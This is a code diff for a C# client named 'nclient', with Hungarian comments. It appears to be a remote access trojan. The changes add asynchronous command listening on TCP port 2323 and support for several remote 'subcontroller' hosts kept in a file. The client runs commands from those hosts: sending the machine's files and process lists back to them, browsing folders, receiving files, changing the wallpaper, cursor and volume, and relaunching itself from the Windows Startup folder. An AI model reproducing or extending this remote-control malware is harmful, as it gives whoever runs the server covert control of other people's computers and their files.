@@ -121,7 +121,7 @@ namespace nclient
 
 
 
-        static void Main(string[] args)
+        static async Task Main(string[] args)
         {
             var host = Dns.GetHostName(); // a gép hostneve
             foreach (var ip in Dns.GetHostEntry(host).AddressList)
@@ -204,30 +204,47 @@ namespace nclient
                 }
             }
 
+            if (File.Exists(workPath+"\\subcontrollers.txt"))
+            {
+
+                foreach (string item in File.ReadLines(workPath + "\\subcontrollers.txt"))
+                {
+                    _ = ListenToCommands(item);
+                }
+            }
+
+            await ListenToCommands(serverIP);
 
 
 
 
+
+        }
+
+        public static async Task ListenToCommands(string subcontroller)
+        {
+            string command = "";
+            string text = "";
         elorol://megpróbál ujra csatlakozni
             try
             {
 
 
-                TcpClient client = new TcpClient(serverIP, 2323);
+                TcpClient client = new TcpClient(subcontroller, 2323);
                 NetworkStream stream = client.GetStream();
-
+                Console.WriteLine($"connected to {subcontroller}:2323");
 
                 while (true)
                 {
                     //Console.WriteLine("breki");
                     byte[] buffer = new byte[1024];
-                    int bytes = stream.Read(buffer, 0, buffer.Length);
+                    int bytes = await stream.ReadAsync(buffer, 0, buffer.Length);
                     text = Encoding.UTF8.GetString(buffer, 0, bytes);//itt kapja meg az üzeneteket
                     //Console.WriteLine(msg);
                     if (!string.IsNullOrEmpty(text))
                     {
 
-                        switch (command) 
+                        switch (command)
                         {
                             case "kys":
                                 Environment.Exit(0);
@@ -235,7 +252,7 @@ namespace nclient
                             case "setwallpaper":
                                 try
                                 {
-                                    text = PathReplace(text); 
+                                    text = PathReplace(text);
                                     SetWallpaper(text);
                                 }
                                 catch (Exception e)
@@ -271,7 +288,7 @@ namespace nclient
                                 {
                                     var pos = System.Windows.Forms.Cursor.Position;
                                     int mennyit = Convert.ToInt32(text);
-                                    SetCursorPos(pos.X, pos.Y+mennyit);
+                                    SetCursorPos(pos.X, pos.Y + mennyit);
                                 }
                                 catch (Exception e)
                                 {
@@ -370,9 +387,9 @@ namespace nclient
                                 break;
 
 
-                                //fetches
+                            //fetches
                             case "fsi":
-                                
+
                                 var computer = new ComputerInfo();
                                 Process cmdprocess = new Process();
 
@@ -461,14 +478,14 @@ namespace nclient
                                 Console.WriteLine("elkudlte elvilegxd");
                                 //Console.ReadKey();
                                 command = "";
-                                continue ;
+                                continue;
                             case "frp":
                                 command = "";
                                 string runningProcesses = @"rp|";
 
                                 Process[] rProcesses = Process.GetProcesses();
 
-                                rProcesses.OrderBy(x=>x.ProcessName);
+                                rProcesses.OrderBy(x => x.ProcessName);
                                 foreach (Process i in rProcesses)
                                 {
                                     runningProcesses += $"{i.ProcessName}\n";
@@ -541,7 +558,8 @@ namespace nclient
                                     if (text == "..")
                                     {
                                         Directory.SetCurrentDirectory(Directory.GetParent(Directory.GetCurrentDirectory()).ToString());
-                                    } else
+                                    }
+                                    else
                                     {
                                         text = PathReplace(text);
                                         Directory.SetCurrentDirectory(text);
@@ -573,14 +591,15 @@ namespace nclient
                                 List<string> cuccokAKonyvtarban = new List<string>();
                                 try
                                 {
-                                    Directory.GetFileSystemEntries(Directory.GetCurrentDirectory()).ToList().ForEach(a =>cuccokAKonyvtarban.Add($"{a}"));
+                                    Directory.GetFileSystemEntries(Directory.GetCurrentDirectory()).ToList().ForEach(a => cuccokAKonyvtarban.Add($"{a}"));
                                     for (int i = 0; i < cuccokAKonyvtarban.Count(); i++)
                                     {
                                         bool mappa = (File.GetAttributes(cuccokAKonyvtarban[i]) & FileAttributes.Directory) == FileAttributes.Directory;
                                         if (mappa)
                                         {
-                                            cuccokAKonyvtarban[i] += "?mappa"; 
-                                        } else cuccokAKonyvtarban[i] += "?fajl";
+                                            cuccokAKonyvtarban[i] += "?mappa";
+                                        }
+                                        else cuccokAKonyvtarban[i] += "?fajl";
                                     }
                                     foreach (string item in cuccokAKonyvtarban)
                                     {
@@ -604,7 +623,7 @@ namespace nclient
                                 break;
                             case "download":
                                 command = "";
-                                if (File.Exists(text))SendFile(text, "melegvagy", client);
+                                if (File.Exists(text)) SendFile(text, "melegvagy", client);
                                 else
                                 {
                                     Send("download", stream);
@@ -633,17 +652,73 @@ namespace nclient
                                     var volume = (IAudioEndpointVolume)obj;
 
                                     // 🔊 50% hangerő
-                                    volume.SetMasterVolumeLevelScalar((float)(Convert.ToDouble(text)/100.0), Guid.Empty);
+                                    volume.SetMasterVolumeLevelScalar((float)(Convert.ToDouble(text) / 100.0), Guid.Empty);
                                 }
                                 catch (Exception)
                                 {
                                     Send("audio|nem jó érték audióra", stream);
                                 }
-                                
+
                                 break;
 
 
+                            case "subcontroller":
+                                command = "";
 
+                                string[] darabolva = text.Split(' ');
+                                switch (darabolva[0])
+                                {
+                                    case "add":
+                                        File.AppendAllLines(Path.Combine(workPath, "subcontrollers.txt"), new string[] { darabolva[1] });
+                                        _ = ListenToCommands(darabolva[1]);
+                                        break;
+                                    case "remove":
+
+                                        var file = Path.Combine(workPath, "subcontrollers.txt");
+                                        var ipToRemove = darabolva[1]?.Trim();
+
+                                        if (File.Exists(file) && !string.IsNullOrWhiteSpace(ipToRemove))
+                                        {
+                                            var lines = File.ReadAllLines(file)
+                                                .Select(l => l.Trim())
+                                                .Where(l => !string.IsNullOrWhiteSpace(l))   // üres sorok kuka
+                                                .Where(l => l != ipToRemove)                // törlendő IP kuka
+                                                .Distinct()                                 // opcionális duplikátum szűrés
+                                                .ToArray();
+
+                                            File.WriteAllLines(file, lines);
+                                        }
+                                        break;
+                                    case "list":
+                                        if (File.Exists(Path.Combine(workPath, "subcontrollers.txt")))
+                                        {
+                                            Send($"subcontrollerlist|{File.ReadAllText(Path.Combine(workPath, "subcontrollers.txt"))}", stream);
+                                        }
+                                        else
+                                        {
+                                            Send($"subcontrollerlist|[$Nincsen subcontroller fajl még$]", stream);
+                                        }
+                                        
+                                        break;
+                                    default:
+                                        break;
+                                }
+
+                                break;
+                            case "reload":
+                                command = "";
+                                var psis = new ProcessStartInfo
+                                {
+                                    FileName = Path.Combine(
+                                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
+                                    "nclient.exe"
+                                ),
+                                    UseShellExecute = true
+                                };
+
+                                Process.Start(psis);
+                                Environment.Exit(0);
+                                break;
 
 
                             case "file|":
@@ -651,10 +726,10 @@ namespace nclient
                                 GetFile(stream, text);
                                 command = "";
 
-                                
+
                                 continue;
                             default:
-                                
+
                                 command = text;
                                 continue;
                         }
@@ -673,10 +748,12 @@ namespace nclient
                 Console.WriteLine(e.ToString());
                 goto elorol;
             }
-            
 
-            
+
         }
+
+
+
 
         static void GetFile(NetworkStream stream, string hova)
         {
